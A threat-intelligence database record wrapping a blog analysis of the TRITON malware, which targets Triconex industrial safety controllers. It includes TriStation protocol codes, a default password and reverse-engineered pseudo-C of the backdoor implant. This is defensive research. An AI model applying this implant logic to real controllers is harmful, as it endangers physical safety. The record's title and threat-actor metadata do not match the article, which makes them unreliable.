{
    "id": "b2dce2d5-6a82-4527-96cd-73d4bc17099d",
    "created_at": "2023-01-12T15:06:02.169297Z",
    "updated_at": "2025-03-27T02:11:39.861582Z",
    "deleted_at": null,
    "sha1_hash": "12ea9806606614e97dd428dd2cdea032b3255462",
    "title": "2016-11-02 - Nymaim Malware- Deep Technical Dive – Adventures in Evasive Malware",
    "authors": "",
    "file_creation_date": "2022-05-06T08:51:11Z",
    "file_modification_date": "2022-05-06T08:51:11Z",
    "file_size": 383143,
    "plain_text": "# Analyzing the TRITON industrial malware\n\n**[midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware](https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware)**\n\nJanuary 16, 2018\n\n[Last month FireEye released a report detailing an incident that their subsidiary Mandiant](https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html)\nresponded to at a critical infrastructure organization. Here a malware framework, dubbed\nTRITON (also referred to as TRISIS or HatMan), was discovered targeting the Schneider\nElectric Triconex line of industrial safety systems, allegedly in order to cause physical\ndamage and shut down operations. The activity was believed to be consistent with a nation\n[state preparing for an attack. According to a Dragos report on the same malware, their team](https://dragos.com/blog/trisis/TRISIS-01.pdf)\ndiscovered TRITON being deployed against at least one victim in the Middle East in midNovember 2017.\n\nThis blog post aims to discuss the incident background, the TRITON framework and the\nattack payload in an effort to clarify this attack in particular and attacks on industrial safety\n[systems in general. It draws upon previously published reports by FireEye,](https://fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.htm) [Dragos and ICS-](https://dragos.com/blog/trisis/TRISIS-01.pdf)\n[CERT as well as analysis (which can be found here) by Midnight Blue and Ali Abbasi of the](https://github.com/samvartaka/triton_analysis)\n[publicly available malware. Further details of the incident and malware are likely to be](https://github.com/ICSrepo/TRISIS-TRITON-HATMAN)\n[discussed by others during this week's S4x18 TRITON/TRISIS session.](https://s4x18.com/sessions/aurora-10-years-later-progress-failure-what-remains-to-be-learned)\n\n## Summary\n\nTRITON is the first publicly known example of malware targeting industrial safety\ncontrollers, an escalation with serious potential consequences compared to previous ICSfocussed incidents. It has been deployed against at least one victim in the Middle East with\nno indications of victims outside of the Middle East so far. TRITON is a framework for\nimplanting Schneider Electric Triconex safety controllers with a passive backdoor through\nwhich attackers can, at a later point in time, inject potentially destructive payloads.\n\nThough the potential impact is very serious (including infrastructural damage and loss of\nlife resulting from sabotaging critical safety systems) it is important to nuance the threat\nposed by the discovery of this malware, especially when the original attacker intent remains\nspeculative. In addition, the attack is not very scalable even against other Triconex safety\ncontrollers due to the complexity of required industrial process comprehension. However, a\nsufficiently knowledgeable and well-resourced attacker seeking to target a facility using\nTriconex controllers as part of its safety systems could repurpose TRITON, thereby lowering\nthe bar somewhat by removing the barrier of reverse-engineering the proprietary TriStation\nprotocol. The incident is illustrative of various woes in the industrial cybersecurity world\nwhich have been discussed extensively over the past years, ranging from devices which are\n\n\n-----\n\ninsecure by design and have been exposed to hyper-connected environments they were not\nquite designed for to a lack of basic IT/OT security hygiene and early warning insights on\npart of asset owners.\n\n## Background\n\nTRITON is one of the few publicly known examples of malware targeting Industrial Control\n[Systems (ICS), after Stuxnet,](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf) [Havex,](https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf) [Blackenergy2 and Industroyer, and the first publicly](https://www.iod.org.nz/Portals/0/Branches%20and%20events/Canterbury/BOOZ%20ALLEN%20-%20When%20the%20Lights%20Went%20Out.pdf)\nknown example of malware targeting industrial safety controllers specifically. Safety\nInstrumented Systems (SIS) are autonomous control systems tasked with maintaining\nautomated process safe states and are typically used to implement safety logic in critical\nprocesses where serious damage or loss of life might be a risk. This is done by, for example,\nmonitoring temperature or pressure via sensor inputs and halting the flow or heating of\ngases when dangerous thresholds are exceeded. They are usually connected to actuators (eg.\nfor opening or closing a valve) in order to override normal process control and halt the\nrunaway process.\n\n[Basic industrial safety & protection layers (source)](http://www.pacontrol.com/safetysystems.html)\n\nSafety controllers are typically a kind of Programmable Logic Controller (PLC) designed to\nhigh standards with redundant modules and tend to have components that allow for safe\nfailure in case the main processor fails or power is lost. They are deployed in a manner\nspecific to the process environment requirements and are usually configured in one of the\n_IEC 61131-3 programming languages (eg. LD, ST, etc.). Of course, safety is not quite the_\n\n\n-----\n\nsame as security and safety controllers tend to have the same kind of insecure by\ndesign' profile as a regular PLC: ie. everything from hardcoded maintenance backdoor\naccounts to insecure proprietary protocols.\n\nTraditionally, SIS connectivity is limited and systems are segregated from the rest of the\nOperational Technology (OT) environment which would limit the potential impact of safety\ncontroller security issues. But over the years, as part of a broader trend in embedded\nsystems in general, this isolation has made way for more and more connectivity and systems\nintegration. While this integration comes with benefits in terms of cost, usability and\nprocess insights for business intelligence purposes, the flip side is that it exposes systems\nthat were never designed for secure connectivity in the first place to the wider OT and IT\nenvironments and by extension to whatever the wider network itself is exposed to. The\npotential implications of a malicious SIS-compromising attacker are serious and could\nrange from shutting down a process to allowing for unsafe states and manipulating other\nparts of the OT environment to create such a state which might result in financial losses,\ndamage to equipment, products and the environment or human safety and loss of life.\n\nBut it's important to nuance this image and avoid alarmist headlines. First of all because\nfear, uncertainty and doubt cause sensible analysis and good advice to be lost amid\nsensationalism and help create a 'boy who cried wolf' effect where the stock that ICS\nequipment vendors and OT asset owners and operators put in the opinions of the security\nindustry as a whole erodes over time. Secondly, while the initial steps along the 'ICS Kill\nChain', up to and including the compromise of the safety controller, might seem relatively\nsimple, crafting the 'OT payload' that actually does the damage is typically neither easy nor\n[scalable. As pointed out by Benjamin Green, Marina Krotofil and Ali Abbasi such attacks](http://eprints.lancs.ac.uk/88089/1/sample_sigconf.pdf)\nrequire a high level of process comprehension which would have to be derived from analysis\nof acquired documents, diagrams, data historian files, device configurations and network\ntraffic. This would have to be done on a facility-to-facility basis since even attacks against\ntwo functionally similar facilities will require attackers to take differences in process scale\nand design, equipment and device configuration into account.\n\nIn the case of SIS that means that a security compromise does not trivially compromise\nprocess safety. Apart from the SIS, the facility in question might have safety measures\nranging from sacrificial parts in machines, enclosures and blast dampers to alarms and\nemergency procedures and as such assessing the implications of SIS compromise would\nrequire facility-specific process comprehension as well. This does not mean that such worstcase scenarios are infeasible but that the attacker space capable of bringing them about and\ntheir scalability are more limited than often portrayed.\n\n## The Incident\n\n\n-----\n\nThe FireEye report claims that the attacker gained remote access to a Triconex engineering\nworkstation running Microsoft Windows as well as the Distributed Control System (DCS).\nThe attacker deployed a Py2EXE application, which was disguised as a benign Triconex log\nreviewing application named Trilog.exe, containing the TRITON framework on the\nengineering workstation together with two binary payload files named inject.bin and\nimain.bin. TRITON does not leverage any 0-days but instead reprograms the target safety\ncontrollers via the TriStation protocol (discussed below) which lacks authentication (though\nACLs could have been configured on the controllers). As the TriStation protocol is\nproprietary and undocumented this means the attacker had to reverse engineer it, possibly\nthrough a combination of using similarities with the documented Triconex System Access\n_Application (TSAA) protocol, inspection of traffic between the engineering workstation and_\nthe controller and reverse-engineering of workstation software and controller firmware.\n\nThe TRITON framework is capable of autodiscovering Triconex controllers on the network\nby sending a UDP broadcast message over port 1502 but this functionality was not used\nduring the incident. Instead the IP addresses of the target controllers were specified directly\nand upon connection the status of the controller was retrieved over TriStation. If the\ncontroller was running the inject.bin and imain.bin payload files were injected into the\ncontroller program memory and a periodic check was initiated to see if any error was\ndetected. If so, TRITON would reset the controller to the previous state over Tristation and\nif this failed it would write a dummy program to memory in what was likely an attempt at\nanti-forensics. During the incident, the industrial process was shutdown as a result of some\ncontrollers entering a failed safe state which caused the asset owner to initiate the\ninvestigation. The cause of this failed safe state was reportedly a failed validation check\nbetween the three separate redundant Triconex processor modules.\n\nThe fact that both the DCS and SIS systems were compromised suggests the attacker\nintended to cause serious damage rather than a mere process shutdown. This hypothesis is\nstrengthened (though not indisputably confirmed) by the fact that the attacker apparently\nmade several attempts to deliver a specific control logic to the safety controllers rather than\nmerely shut them down.\n\n## Triconex Safety Instrumented Systems (SIS)\n\nThe Schneider Electric Triconex line of safety controllers consists of the Tricon (CX),\n_Trident and Tri-GP systems all of which share the triple modular redundancy (TMR)_\narchitecture. While the incident targeted Tricon 3008 controllers specifically, the heart of\nthe attack is the (ab)use of the unauthenticated TriStation protocol and as such all safety\ncontrollers running this protocol are potentially affected.\n\n[According to the Planning and Installation Guide for Tricon v9–v10 Systems, a basic Tricon](https://www.nrc.gov/docs/ML0932/ML093290420.pdf)\ncontroller consists of the Main Processors, I/O modules, communication modules, chassis,\nfield wiring connections and an engineering workstation PC communicating with the\n\n\n-----\n\ncontroller over TriStation. A chassis houses\nthree Main Processor (MP) Modules, each of\nwhich serve one channel (or 'leg') of the\ncontroller and independently executes the\ncontrol program and communicates with its\nown I/O subsystem (every I/O module has\nthree independent channels for serving the\nthree MPs) in parallel with the other Main\nProcessors. The three MP modules, which\noperate autonomously without shared clocks,\npower regulation or circuitry, then compare\ndata and control program at periodic intervals\nand synchronize with their neighbors over a\nhigh-speed proprietary communications bus\nnamed TriBus. TriBus consists of three\nindependent serial links. Hardware voting on\nthe I/O data takes place over TriBus among the\nMPs and if disagreement occurs, the signal in\ntwo out of three prevails and the third MP is\ncorrected. Here one-time differences are\ndistinguished from patterns of differences.\nThis Triple Modular Redundant (TMR)\narchitecture is designed for fault tolerance in\nthe face of transient faults or component\nfailures.\n\n\n[Tricon 3008 front panel (source)](https://www.nrc.gov/docs/ML0932/ML093290420.pdf)\n\n\n-----\n\nThere are a variety of communication modules, talking to the Main Processors over the\ncommunication bus, for Triconex controllers to facilitate serial and network\ncommunications across a variety of protocols. Examples include the Advanced\n_Communication Module (ACM) which acts as an interface between a Tricon controller and a_\n_Foxboro Intelligent Automation (I/A) Series DCS, the Hiway Interface Module (HIM)_\nwhich acts as an interface between a Tricon controller and a Honeywell TDC-3000 control\nsystem or the Tricon Communication Module (TCM) which allows communications with\nTriStation, other Triconex controllers, Modbus master/slave devices and external hosts over\nEthernet networks. These communications include the documented Tricon System Access\n_Application (TSAA) protocol, a multi-slave master/slave protocol used to read and write_\ndata points, and the undocumented TriStation protocol, a single-slave master/slave protocol\n[used by the TriStation 1131 or MSW engineering workstation software to develop and](https://www.nrc.gov/docs/ML0932/ML093290423.pdf)\ndownload the control program running on the Triconex controllers. By default, Ethernet\ncommunications for TSAA take place over UDP port 1500 while those for TriStation take\nplace over UDP port 1502.\n\nThe Triconex controllers have a physical four-position key switch which can be set to either\n_RUN (normal operation, read-only but can be overridden by a GATENB function block in_\nthe control program), PROGRAM (allows control program loading and verification), STOP\n(stop reading inputs, forces non-retentive digital and analog outputs to 0, and halts the\ncontrol program. This position can be overridden by TriStation) or REMOTE (allows writes\nto control program variables). However, in the incident in question the target controllers\nwere left in PROGRAM mode and the payload injected by TRITON (described below) allows\nsubsequent malicious modifications by means of communications with the implant\nregardless of key switch position.\n\n\n-----\n\nA control program is developed and debugged with the TriStation 1131 / MSW software,\ndownloaded to the controller over the TriStation protocol, stored in Flash and then loaded\ninto SRAM or DRAM (depending on the Tricon version) to be executed by the Main\nProcessor module. The control program is translated from one of the IEC 61131-3 languages\n(LD, FBD, ST) into native PowerPC machine code and interfaces only with the main\nprocessor.\n\n[Shortly after the incident was disclosed, the TRITON framework and payloads were found](https://github.com/ICSrepo/TRISIS-TRITON-HATMAN)\nto be publicly available from multiple sources. The payload files (eg. imain.bin) contain\nPowerPC shellcode and from this we can infer that the target Triconex controllers in the\nincident seem to have been using the Tricon 3008 Main Processor Modules. Since older\nTricon MPs such as the 3006 or 3007 would use the 32-bit National Semiconductor\n_32GX32 and newer ones such as the 3009 use a (reportedly ARM) dual-core 32-bit_\nprocessor running at 800MHz, the 3008 are the only Tricon MPs (to our knowledge) which\nuse the PowerPC architecture. More specifically they use the 32-bit Freescale PowerQUICC\nMPC860EN microcontroller, a detail which will be relevant when dissecting the shellcode\npayloads later on.\n\nThe Tricon 3008 MP runs the Enhanced Triconex System Executive (ETSX) firmware\n(stored in flash) which executes the control program on the main processor. On older Tricon\nMP modules firmware updates had to take place by manually replacing EPROMs made\n\n\n-----\n\naccessible through cutouts in module side panel but on the Tricon 3008 firmware can be\nupgraded over Ethernet through the port on the front panel. This can be done by connecting\nthe Ethernet port to a workstation PC running the TcxFwm.exe firmware manager. The\ndedicated Input and Output Control and Communication (IOCCOM) processor (also an\nMPC860EN) runs its own firmware separate from the ETSX which can be upgraded in the\nsame fashion using the firmware manager.\n\n## The TRITON Framework\n\nThe rather lean TRITON framework was built to facilitate interacting with a Tricon\ncontroller via the unauthenticated TriStation protocol over Ethernet. It is capable of\nfunctionality such as reading and writing control programs and data, running and halting a\nprogram and retrieving status information. The framework is written in Python and consists\nof the following components:\n\n_TS_cnames.py: contains named lookup constants for TriStation protocol function and_\nresponse codes as well as key switch and control program states.\n\n_TsHi.py: the high-level interface of the framework which allows for reading and_\nwriting functions and programs as well as retrieving project information and\ninteraction with the implant payload (as described later). Most interestingly, it\nincludes the SafeAppendProgramMod function which fetches the program table,\nreads programs and functions and appends supplied shellcode to an existing control\nprogram. It also handles CRC32 checksums where necessary.\n\n_TsBase.py: acts as a translation layer between the high-level interface and the low-_\nlevel TriStation function codes and data formatting for functionality such as uploading\nand downloading of programs or fetching control program status and module\nversions.\n\n_TsLow.py: the lowest layer which implements the functionality to send TriStation_\npackets crafted by the upper layers to the Tricon Communication Module (TCM) over\nUDP. Also includes auto-discovery of Tricon controllers by sending an UDP 'ping'\nbroadcast message (0x06 0x00 0x00 0x00 0x00 0x88) on port 1502.\n\nFinally, apart from the framework there is a script named script_test.py which uses the\nframework to connect to a Tricon controller and inject a multi-stage payload described later\non.\n\n## The TriStation Protocol\n\n\n-----\n\nThe TriStation protocol is a typical UDP-based serial-over-ethernet protocol as encountered\nthroughout the world of industrial control systems. Request packets consist of a 2-byte\nfunction code (FC) followed by a counter ID, length field and request data together with\nchecksums. Responses consist of a response code (RC), length field, response data and\nchecksums.\n\nWhile we will not exhaustively document the TriStation protocol as reconstructed from the\nTRITON framework here, the 'heart' of the TRITON attack lies in the following sequence of\nfunction codes and expected response codes:\n\n'Start download change' (FC: 0x01). Expects 'Download change permitted' (RC:\n0x66). Arguments are `[old_name] [version info] [new_name] [program info]`.\n\n'Allocate program' (FC: 0x37). Expects 'Allocate program response' (RC: 0x99).\nArguments are `[id] [next] [full_chunks] [offset] [len] [data]`.\n\n'End download change' (FC: 0x0B). Expects 'Modification accepted' (RC: 0x67).\n\nApart from that the following TriStation command is used to communicate with the implant\nafter it has been successfully injected:\n\n'Get MP status' (FC: 0x1D). Expects 'Get system variables response' (RC: 0x96).\nArguments are `[cmd] [mp] [data]`.\n\n[Interestingly, the TriStation Developer's Guide mentions it is possible to restrict access to a](https://www.nrc.gov/docs/ML0932/ML093290423.pdf)\nTricon controller from a TriStation PC.Projects themselves can be 'password protected'\n(though in practice this often comes down to a hashed or even plaintext password stored in\nthe project file which the workstation software checks upon opening the project) and a\npassword can be required for connecting to the controller (which is specified in the project\nand takes effect after it has been downloaded to the controller). Such a password is not\npresent initially and by default the password is 'PASSWORD'. Seeing as how the TriStation\nprotocol itself is unencrypted, however, any attacker capable of observing network traffic\nbetween the controller and workstation is likely to be able to circumvent such a protection.\n\nThe developer's guide also mentions that model 4351A and 4352A TCMs allow for IP-based\nclient access control lists to be specified which regulate access to a resource (ability to\nperform download change or download all, access to diagnostic information, etc.) at a\ncertain level (deny, read only or read/write). It seems that this functionality could\npotentially be used to restrict from what IP addresses the TRITON framework could inject\nits payload or communicate with the implant but the strength of such a workaround would\nrely on mitigating the ability of the attacker to move laterally among engineering\nworkstations. UDP IP spoofing could also be a problem here.\n\n## The Payload\n\n\n-----\n\nThe payload used in the incident can be thought of as a four-stage shellcode. The first stage\nis an argument-setting piece of shellcode. The second stage is formed by inject.bin (which is\ncurrently not publicly available) which functions as an implant installer. The third stage is\nformed by imain.bin (discussed below) which functions as a backdoor implant capable of\nreceiving and executing the fourth stage. The final stage would have been formed by an\nactual 'OT payload' performing the disruptive operations but apparently no such payload\nwas recovered during the incident since the attacker was discovered while preparing the\nimplant. A high-level description of the first two stages can be found in the United States\nDepartment of Homeland Security ICS-CERT report on TRITON/TRISIS/HatMan.\n\n### Stage 1: Argument-Setter (PresetStatusField)\n\n[After connecting to the target controller the script calls PresetStatusField which injects a](https://github.com/ICSrepo/TRISIS-TRITON-HATMAN/blob/c27fcae3dcb0d0ce36ddeef081851039c4a0658d/decompiled_code/script_test.py#L12)\npiece of shellcode using SafeAppendProgramMod. What this shellcode does is iterate\nthrough memory from address 0x800000 to 0x800100 (in DRAM) until it finds an address\nwhere two 32-bit marker values 0x400000 and 0x600000 reside side-by-side. If it finds\nthis, it writes a value (0x00008001) to offset 0x18 from this address. We reverseengineered and created a cleaned-up pseudo-c for this shellcode:\n```\nr2 = 0x800000;\nwhile (true)\n{\n  if ((uint32_t)*(uint32_t*)(r2) == 0x400000) // cp_status.us\n  {\n    if ((uint32_t)*(uint32_t*)(r2 + 4) == 0x600000) // cp_status.ds\n    {\n      r2 += 0x18; // cp_status.fstat\n      *(uint32_t*)(r2) = (uint32_t)value;\n      break;\n    }\n  }\n  if ((r3 & 0xffffffff) >= 0x800100)\n  {\n    break;\n  }\n  r2 += 4;\n}\nsystem_call(-1);\n\n```\nThis shellcode writes the attacker-supplied value into the 'fstat' field of the Control\n_Program (CP) Status structure. This is followed by a TriStation request for the CP status_\nand a check to see whether the returned value equals the supplied value. The value in\nquestion (0x00008001) is used as an argument by the second-stage inject.bin shellcode.\n\n## Stage 2: Implant Installer (inject bin)\n\n\n-----\n\nSince inject.bin has not been publicly released, we will limit our discussion here to what has\nbeen published by other parties and can be inferred from the publicly available materials.\nBased on these resources it is our conjecture that inject.bin is an implant installer which\nrelocates the imain.bin implant backdoor to part of the Enhanced Triconex System\n_Executive (ETSX) in order to allow for attacker read/write/execute access to safety_\ncontroller memory regardless of the Tricon key switch position.\n\nAfter the argument-setting shellcode has been injected, inject.bin and imain.bin are injected\nusing SafeAppendProgramMod. It is interesting to note here that imain.bin is sandwiched\nbetween two markers (0x1234 and 0x56789A) and length fields. The ICS-CERT report\nmentions inject.bin assumes the argument written by the first stage payload resides at a\nstatic address and uses it as 1) a countdown for the number of cycles to idle 2) a step counter\nto track and control execution progress and 3) a field for writing debug information upon\nfailure. In this way the attacker can monitor inject.bin for problems. If no problems are\ndetected 'Script SUCCESS' is output and a dummy program containing nothing but a\n_system_call(-1); is forcefully appended._\n\n[inject.bin control-flow (source)](https://ics-cert.us-cert.gov/sites/default/files/documents/MAR-17-352-01%20HatMan%E2%80%94Safety%20System%20Targeted%20Malware_S508C.pdf)\n\nThe inject.bin shellcode has the above flowchart (courtsey of the ICS-CERT report) and\nseems to be a finite state machine which starts by waiting for a number of cycles before\nissuing a number of system calls and checking their results. If these checks are passed, the\n\n\n-----\n\nimain.bin shellcode is relocated and the function pointer of the _get main processor_\n_diagnostic data' TriStation command is changed to the address of the relocated imain.bin_\nso that it is executed prior to the normal handler.\n\nAs [Reid Wightman noted, inject.bin seems to contain egg-hunter functionality hunting for](https://vimeo.com/248057640)\nthe 0x1234 and 0x56789A 'eggs' surrounding imain.bin. This is probably due to a lack of\ncontrol by the TriStation functionality underlying SafeAppendProgramMod in determining\n[where the injected code ends up which would require a piece of GetPC code to determine](https://nets.ec/Shellcode/Environment#GetPc)\nwhere inject.bin currently lives and a subsequent egghunt to determine where any other\ninjected code or data lives if one cannot be sure offsets remain static upon injection. After\nthis information is known to inject.bin it can safely relocate imain.bin.\n\n### Stage 3: Backdoor Implant (imain.bin)\n\nThe third stage shellcode, imain.bin, is a backdoor implant which allows an attacker to have\nread/write/execute access to safety controller memory regardless of the Tricon key switch\nposition or any reset of control programs by the engineering workstation. This would allow\nan attacker to inject and execute a disruptive 'OT payload' at a later moment. It is currently\nunclear whether the backdoor would persist across a safety controller reboot as it seems to\nmodify the in-memory copies of the control program and firmware rather than their onflash copies. The FireEye report mentions that they patched the attacker script to allow for\nin-memory persistence of the payload but this seems unrelated to cross-reboot persistence.\n\nIt is executed before the actual handler for the TriStation 'get main processor diagnostic\n_data' command and looks for a specifically crafted packet body from which it extracts a_\ncommand value and its arguments. It supports three commands: reading and writing from\nand to memory as well as executing code at an arbitrary address. It is capable of making\nnon-persistent changes to the running firmware by disabling address translation, writing to\nit and then flushing the instruction cache and re-enabling address translation.\n\nThe TRITON framework can communicate with the implant over the aforementioned\nchannel by using the TsHi.ExplReadRam(Ex), TsHi.ExplWriteRam(Ex) and\n_TsHi.ExplExec functions which utilize the TsBase.ExecuteExploit function. The latter_\nfunction send a TriStation 'get main processor diagnostic data' command with a crafted\npacket body of the form:\n\n[command (1 byte)] [MP (1 byte)] [field_0 (4 bytes)] [field_1 (4 bytes)] [field_2 (N bytes)]\nWe reverse-engineered the imain.bin implant and manually reconstructed the following\napproximation in pseudo-C:\n\n\n-----\n\n```\n#define M_READ_RAM 0x17\n#define M_WRITE_RAM 0x41\n#define M_EXECUTE  0xF9\nstruct argument_struct\n{\n  uint16_t unknown_ui16_00;\n  uint8_t unknown_ui8_02;\n  uint16_t return_value;\n  uint8_t cmd;        // cmd field\n  uint8_t mp;          // mp field\n  uint32_t field_0;      // argument field 0 (eg. size)\n  uint32_t field_1;      // argument field 1 (eg. address)\n  uint8_t field_3[...];   // argument field 3 (eg. data)\n};\nvoid imain(void)\n{\n  arg = (struct argument_struct*)get_argument();\n  // Retrieve implant command and MP value\n  cmd = arg->cmd;\n  mp = arg->mp;\n  compare_mp = *(uint8_t*)(0x199400);\n  if ((mp == compare_mp) || (mp == 0xFF))\n  {\n    mp = arg->return_value;\n    // Check implant command\n    switch (cmd)\n    {\n      // Read N bytes from RAM at address X\n      case M_READ_RAM:\n      {\n        if (mp >= 0x14)\n        {\n          size = arg->field_0;\n          address = arg->field_1;\n          if ((size > 0) && (size <= 0x400))\n          {\n            memcpy(&arg->cmd, address, size);\n            return_value = (size + 0xA);\n          }\n          else\n          {\n            goto main_end;\n          }\n        }\n        else\n        {\n          goto main_end;\n        }\n      }break;\n\n```\n\n-----\n\n```\n      // Write N bytes to RAM at address X\n      case M_WRITE_RAM:\n      {\n        size = arg->field_0;\n        address = arg->field_1;\n        data = arg->field_3;\n        if ((size > 0) && (size == (mp - 0x14)))\n        {\n          reenable_address_translation = 0;\n          if (address < 0x100000)\n          {\n            reenable_address_translation = 1;\n            disable_address_translation();\n          }\n          memcpy(address, &data, size);\n          if (reenable_address_translation == 1)\n          {\n            enable_address_translation();\n          }\n          return_value = 0xA;\n        }\n        else\n        {\n          goto main_end;\n        }\n      }break;\n      // Execute function at address X\n      case M_EXECUTE:\n      {\n        if (mp >= 0x10)\n        {\n          function_ptr = arg->field_0;\n          if (function_ptr < 0x100000)\n          {\n            call(function_ptr);\n            return_value = 0xA;\n          }\n          else\n          {\n            goto main_end;\n          }\n        }\n        else\n        {\n          goto main_end;\n        }\n\n```\n\n-----\n\n```\n      }break;\n    }\n    switch_end:\n      arg->unknown_ui8_02 = 0x96;\n      arg->return_value = return_value;\n      tristation_mp_diagnostic_data_response();\n  }\n  // This most likely continues with the actual TriStation 'get main processor\ndiagnostic data' handler\n  main_end:\n    jump(0x3A0B0);\n}\nvoid disable_address_translation(void)\n{\n  mtpsr eid, r3;  // External Interrupt Disable (EID) = r3\n  r4 = -0x40;    // 11111111111111111111111111011000; Sets IR=0 (Instruction\naddress translation is disabled), DR=1 (Data address translation is enabled)\n  mfmsr r3;    // r3 = Machine State Register\n  r3 = r4 & r3;  // Disable instruction address translation\n  mtmsr r3;    // Machine State Register = r3\n  return;\n}\nvoid enable_address_translation(void)\n{\n  r3 = 0xC000000;    // 00001100000000000000000000000000; IC_CST CMD = 110\n(Instruction cache invalidate all command)\n  mtspr ic_csr, r3;  // Instruction Cache Control and Status Register = r3.\n  isync;        // Synchronize context, flush instruction queue\n  mfmsr r3;       // r3 = Machine State Register\n  r3 |= 0x30;     // 110000; Sets IR=1 (Instruction address translation is\nenabled), DR=1 (Data address translation is enabled)\n  mtmsr r3;       // Machine State Register = r3\n  sync;         // Ordering to ensure all instructions initiated prior to\nthe sync instruction complete and no subsequent ones initiate until synced\n  mtspr eie, r3;     // External Interrupt Enable (EIE) = r3\n  return;\n}\n// This most likely retrieves the argument to the TriStation 'get main processor\ndiagnostic data' command\nvoid get_argument(void)\n{\n  r3 = r31;\n  jump(0x6B9CC);\n}\n// This most likely sends a response to the TriStation 'get main processor\ndiagnostic data' command\nvoid tristation_mp_diagnostic_data_response(void)\n\n```\n\n-----\n\n```\n{\n  r3 = r31;\n  jump(0x68F0C);\n}\n\n### Stage 4: Missing OT Payload\n\n```\nIn order to affect operations beyond a mere process shutdown (ie. the dreaded cyberphysical damage scenario), a fourth-stage 'OT payload' causing or facilitating a safety failure\nwould be required. As mentioned before, however, it was claimed no OT payload was\nrecovered during the incident. The absence of an OT payload on the compromised\nengineering workstation could imply it would have been dropped later after initial safety\ncontroller implantation tests had passed. It is conceivable an attacker would want to make\nsure multiple safety controllers were properly implanted and working before activating a\npossibly complicated (collection of) OT payload(s). But it's also possible the attacker hadn't\nstarted to develop a proper OT payload yet while they were already implanting the\ncontrollers. Regardless, any assessment of the attacker's end game under these conditions\nremains speculative.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/ICS SCADA/Triton/Analyzing the TRITON industrial malware.pdf"
    ],
    "report_names": [
        "Analyzing the TRITON industrial malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
